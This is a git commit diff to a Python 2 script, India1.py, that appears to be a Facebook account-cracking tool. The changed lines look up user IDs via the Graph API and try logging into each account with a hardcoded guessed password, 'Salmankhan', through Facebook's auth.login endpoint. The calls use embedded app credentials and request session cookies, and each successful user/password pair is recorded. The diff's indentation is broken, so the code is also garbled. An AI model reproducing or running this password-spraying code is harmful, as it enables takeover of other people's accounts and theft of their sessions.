d88568e4dc9ca7932b81e981e60757a299e0079a
Aryano Devil <81142233+aryanotriks@users.noreply.github.com>
2021-04-16 23:55:07 -0700

    Update India1.py

--- India1.py
+++ India1.py
@@ -354,13 +354,14 @@ def pilih_super():
 									else:
 										a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 										b = json.loads(a.text)
-										pass5 = 'Salmankhan'
-										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									        q = json.load(data)
-									        if 'access_token' in q:
+										else:
+											pass5 = 'Salmankhan'
+											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									                q = json.load(data)
+									                if 'access_token' in q:
 										        print '\x1b[1;91m[\x1b[1;91mSuccessful\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass5
 										        oks.append(user+pass5)
-                            else:
+											else:
 										          a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 										          b = json.loads(a.text)
 															
